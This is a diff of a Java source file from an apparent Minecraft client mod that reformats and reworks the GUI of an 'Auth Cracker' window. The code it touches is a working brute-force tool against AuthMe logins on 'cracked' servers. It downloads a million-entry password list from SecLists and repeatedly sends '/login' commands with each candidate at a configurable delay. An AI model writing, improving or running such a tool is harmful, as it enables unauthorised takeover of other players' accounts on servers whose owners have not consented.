@@ -18,15 +18,6 @@
 
 package net.aoba.gui.navigation.windows;
 
-import com.mojang.logging.LogUtils;
-import net.aoba.gui.Margin;
-import net.aoba.gui.components.ButtonComponent;
-import net.aoba.gui.components.SliderComponent;
-import net.aoba.gui.components.StackPanelComponent;
-import net.aoba.gui.components.StringComponent;
-import net.aoba.gui.navigation.Window;
-import net.aoba.settings.types.FloatSetting;
-import net.minecraft.client.MinecraftClient;
 import java.io.IOException;
 import java.net.URI;
 import java.net.URISyntaxException;
@@ -34,123 +25,138 @@ import java.net.URL;
 import java.util.Scanner;
 import java.util.concurrent.TimeUnit;
 
+import com.mojang.logging.LogUtils;
+
+import net.aoba.gui.components.ButtonComponent;
+import net.aoba.gui.components.SeparatorComponent;
+import net.aoba.gui.components.SliderComponent;
+import net.aoba.gui.components.StackPanelComponent;
+import net.aoba.gui.components.StringComponent;
+import net.aoba.gui.navigation.Window;
+import net.aoba.settings.types.FloatSetting;
+import net.minecraft.client.MinecraftClient;
+
 public class AuthCrackerWindow extends Window {
-    private ButtonComponent start;
+	private ButtonComponent start;
+	private StringComponent startButtonText;
 
-    private FloatSetting delay = FloatSetting.builder()
-    		.id("authcracker_delay")
-    		.displayName("Delay")
-    		.defaultValue(100f)
-    		.minValue(50f)
-    		.maxValue(50000f).build();
+	private FloatSetting delay = FloatSetting.builder().id("authcracker_delay").displayName("Delay").defaultValue(100f)
+			.minValue(50f).maxValue(50000f).build();
 
-    private AuthCracker authCracker;
+	private AuthCracker authCracker;
 
-    Runnable startRunnable;
-    Runnable endRunnable;
+	Runnable startRunnable;
+	Runnable endRunnable;
 
-    public AuthCrackerWindow() {
-        super("Auth Cracker", 810, 500, 280, 360);
-        
-        this.inheritHeightFromChildren = true;
-        
-        StackPanelComponent stackPanel = new StackPanelComponent(this);
-        stackPanel.setMargin(new Margin(null, 30f, null, null));
-        
-        StringComponent label = new StringComponent("This panel can be used to break Auth passwords used in cracked servers.", stackPanel);
-        stackPanel.addChild(label);
+	public AuthCrackerWindow() {
+		super("Auth Cracker", 185, 150);
 
-        SliderComponent slider = new SliderComponent(stackPanel, delay);
-        stackPanel.addChild(slider);
+		this.minWidth = 350f;
+		StackPanelComponent stackPanel = new StackPanelComponent(this);
 
-        authCracker = new AuthCracker(delay);
+		stackPanel.addChild(new StringComponent(stackPanel, "AuthCracker"));
+		stackPanel.addChild(new SeparatorComponent(stackPanel));
 
-        this.startRunnable = new Runnable() {
-            @Override
-            public void run() {
-                authCracker.Start();
-                start.setText("Cancel");
-                start.setOnClick(endRunnable);
-            }
-        };
+		StringComponent label = new StringComponent(stackPanel,
+				"This panel can be used to break Auth passwords used in cracked servers.");
+		stackPanel.addChild(label);
 
-        this.endRunnable = new Runnable() {
-            @Override
-            public void run() {
-                authCracker.Stop();
-                start.setText("Start");
-                start.setOnClick(startRunnable);
-            }
-        };
+		SliderComponent slider = new SliderComponent(stackPanel, delay);
+		stackPanel.addChild(slider);
 
-        start = new ButtonComponent(stackPanel, "Start", startRunnable);
-        stackPanel.addChild(start);
+		authCracker = new AuthCracker(delay);
 
-        this.children.add(stackPanel);
-    }
+		this.startRunnable = new Runnable() {
+			@Override
+			public void run() {
+				authCracker.Start();
+				startButtonText.setText("Cancel");
+				start.setOnClick(endRunnable);
+			}
+		};
+
+		this.endRunnable = new Runnable() {
+			@Override
+			public void run() {
+				authCracker.Stop();
+				startButtonText.setText("Start");
+				start.setOnClick(startRunnable);
+			}
+		};
+
+		start = new ButtonComponent(stackPanel, startRunnable);
+
+		// Create Text inside button
+		startButtonText = new StringComponent(start, "Start");
+		start.addChild(startButtonText);
+		stackPanel.addChild(start);
+
+		this.children.add(stackPanel);
+	}
 }
 
 class AuthCracker {
 
-    private Thread curThread;
-    private boolean shouldContinue = true;
-    private MinecraftClient mc = MinecraftClient.getInstance();
-    private FloatSetting delay;
+	private Thread curThread;
+	private boolean shouldContinue = true;
+	private MinecraftClient mc = MinecraftClient.getInstance();
+	private FloatSetting delay;
 
-    public AuthCracker(FloatSetting delay) {
-        this.delay = delay;
-    }
+	public AuthCracker(FloatSetting delay) {
+		this.delay = delay;
+	}
 
-    private long time = System.currentTimeMillis();
+	private long time = System.currentTimeMillis();
 
-    private void RunAuthCracker() {
-        LogUtils.getLogger().info("Aoba AuthMe Cracker Started.");
-        URL url;
-        Scanner s = null;
-        try {
-            URI uri = new URI("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt");
-            url = uri.toURL();
-            s = new Scanner(url.openStream());
-        } catch (IOException e) {
-            e.printStackTrace();
-        } catch (URISyntaxException e) {
-            e.printStackTrace();
-        }
-        if (s != null) {
-            while (shouldContinue && s.hasNextLine()) {
-                if (System.currentTimeMillis() - time > delay.getValue().floatValue()) {
-                    String str = s.nextLine();
-                    while (mc.player == null) {
-                        try {
-                            TimeUnit.SECONDS.sleep(1);
-                        } catch (InterruptedException e) {
-                            e.printStackTrace();
-                        }
-                    }
-                    if (mc.player.networkHandler != null) {
-                        mc.player.networkHandler.sendChatCommand("login " + str);
-                        time = System.currentTimeMillis();
-                    } else {
-                        LogUtils.getLogger().error("Network Handler is null");
-                    }
-                }
-            }
-        }
+	private void RunAuthCracker() {
+		LogUtils.getLogger().info("Aoba AuthMe Cracker Started.");
+		URL url;
+		Scanner s = null;
+		try {
+			URI uri = new URI(
+					"https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt");
+			url = uri.toURL();
+			s = new Scanner(url.openStream());
+		} catch (IOException e) {
+			e.printStackTrace();
+		} catch (URISyntaxException e) {
+			e.printStackTrace();
+		}
+		if (s != null) {
+			while (shouldContinue && s.hasNextLine()) {
+				if (System.currentTimeMillis() - time > delay.getValue().floatValue()) {
+					String str = s.nextLine();
+					while (mc.player == null) {
+						try {
+							TimeUnit.SECONDS.sleep(1);
+						} catch (InterruptedException e) {
+							e.printStackTrace();
+						}
+					}
+					if (mc.player.networkHandler != null) {
+						mc.player.networkHandler.sendChatCommand("login " + str);
+						time = System.currentTimeMillis();
+					} else {
+						LogUtils.getLogger().error("Network Handler is null");
+					}
+				}
+			}
+		}
 
-        LogUtils.getLogger().info("Aoba AuthMe Cracker Stopped.");
-    }
+		LogUtils.getLogger().info("Aoba AuthMe Cracker Stopped.");
+	}
 
-    public void Start() {
-        curThread = new Thread(new Runnable() {
-            @Override
-            public void run() {
-                RunAuthCracker();
-            }
-        });
-        curThread.start();
-    }
+	public void Start() {
+		curThread = new Thread(new Runnable() {
+			@Override
+			public void run() {
+				RunAuthCracker();
+			}
+		});
+		curThread.start();
+	}
 
-    public void Stop() {
-        this.shouldContinue = false;
-    }
+	public void Stop() {
+		this.shouldContinue = false;
+	}
 }
